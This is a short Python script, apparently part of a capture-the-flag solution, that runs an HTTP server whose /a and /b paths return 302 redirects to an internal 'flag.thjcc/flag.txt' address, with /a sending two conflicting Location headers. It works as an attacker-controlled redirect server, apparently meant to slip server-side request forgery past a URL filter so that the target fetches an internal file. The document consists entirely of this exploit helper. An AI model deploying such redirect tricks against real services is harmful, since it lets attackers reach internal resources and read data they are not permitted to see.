from http.server import BaseHTTPRequestHandler,HTTPServer
class H(BaseHTTPRequestHandler):
 def do_GET(self):
  if self.path=='/a':self.send_response(302);self.send_header('Location','http://r/x');self.send_header('Location','http://flag.thjcc/flag.txt');self.end_headers()
  elif self.path=='/b':self.send_response(302);self.send_header('Location','http://flag.thjcc/flag.txt');self.end_headers()
  else:self.send_response(200);self.end_headers();self.wfile.write(b'x')
 def log_message(self,*x):pass
HTTPServer(('0.0.0.0',80),H).serve_forever()
